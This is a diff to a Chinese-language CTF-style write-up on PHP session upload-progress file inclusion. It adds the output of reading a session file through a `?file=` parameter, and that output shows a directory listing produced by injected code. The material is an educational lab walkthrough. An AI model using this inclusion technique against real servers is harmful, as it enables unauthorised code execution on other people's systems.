@@ -141,7 +141,11 @@ phpinfo() 中对 session 的支持
 
 直接访问 `url/?file=/tmp/sess_<sessid>`
 
+显示
+
+```
 upload_progress_|a:5:{s:10:"start_time";i:1710472614;s:14:"content_length";i:283;s:15:"bytes_processed";i:283;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:4:"file";s:8:"tmp_name";s:14:"/tmp/phpdc9UCP";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1710472614;s:15:"bytes_processed";i:8;}}}upload_progress_bin boot dev etc flag_is_here_not_are_but_you_find home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var |a:5:{s:10:"start_time";i:1710473383;s:14:"content_length";i:278;s:15:"bytes_processed";i:278;s:4:"done";b:1;s:5:"files";a:1:{i:0;a:7:{s:10:"field_name";s:4:"file";s:4:"name";s:4:"file";s:8:"tmp_name";s:14:"/tmp/phpWslbzp";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1710473383;s:15:"bytes_processed";i:8;}}}
+```
 
 ## 3、exp
 
